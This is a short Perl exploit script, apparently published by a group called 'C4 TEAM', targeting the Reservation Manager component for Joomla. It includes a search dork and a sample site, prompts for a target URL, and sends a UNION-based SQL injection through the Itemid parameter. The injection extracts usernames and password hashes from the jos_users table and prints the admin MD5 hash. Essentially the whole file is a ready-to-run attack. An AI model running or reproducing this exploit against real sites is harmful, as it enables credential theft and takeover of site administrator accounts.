#!/usr/bin/perl -w
 


###############################################
#[~] Author         :ByALBAYX                 #
#                                             #
#[~] Web Site       :WWW.C4TEAM.ORG           #
#                                             #
#[~] Component_Name :Reservation Manager      #
#[~] Component_Name :Reservation Manager Pro  #
#                                             #
#[~] Script_Name    :Joomla                   #
#                                             #
#[~] Dork           :com_reservation   vs..   #
#                                             # 
#[~] S.Site         :http://webformatique.com #     
#                                             #     
###############################################

 
 
system("color f");
print "\t\t-------------------------------------------------------------\n\n";
print "\t\t|||                        C4 TEAM                         |||\n\n";
print "\t\t-------------------------------------------------------------\n\n";
print "\t\t|||      Reservation Manager Pro  Remote SQL Inj Vuln      |||\n\n";
print "\t\t|||       BYALBAYX     WWWW.C4TEAM.ORG     BYALBAYX        |||\n\n";
print "\t\t-------------------------------------------------------------\n\n";
 
use LWP::UserAgent;
 
print "\n[http://wwww.example.com/path/]: ";
 chomp(my $target=<STDIN>);
 
$column_name="concat(username,0x3a,password)";
$table_name="jos_users";
 
$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
 
$host = $target .   "/index.php?option=com_reservation&Itemid=1+union+select+1,".$column_name."+from/**/".$table_name."--";
$res = $b->request(HTTP::Request->new(GET=>$host));$answer = $res->content; if ($answer =~/([0-9a-fA-F]{32})/){
  print "\n[+] Admin Hash : $1\n\n";
  print "#   Tebrikler Exploit Calisti!  #\n\n";
}
else{print "\n[-] Exploit Calismadi...\n";
}

